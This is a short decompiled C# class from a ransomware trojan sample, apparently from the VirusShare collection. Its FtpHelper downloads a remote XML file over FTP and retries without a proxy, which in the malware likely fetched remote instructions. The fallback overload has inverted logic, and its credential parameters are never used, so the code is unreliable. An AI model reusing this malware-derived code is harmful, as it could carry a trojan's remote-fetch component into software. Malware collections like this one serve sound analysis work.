// Decompiled with JetBrains decompiler
// Type: ProxyService.FtpHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 376BB12E-163D-442B-85A9-E33D8806BC45
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.t-92fcc4ce620844256447b8cf217b3ad65fb1bc843d1ea583f6ae64bac1bb9ee7.exe

using System;
using System.IO;
using System.Net;

namespace ProxyService
{
  public class FtpHelper
  {
    public static string GetXml(string uri, string user, string pass, bool noproxy)
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(uri);
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        return end;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static string GetXml(string uri, string user, string pass) => FtpHelper.GetXml(uri, user, pass, false) == "" ? FtpHelper.GetXml(uri, user, pass, true) : "";
  }
}
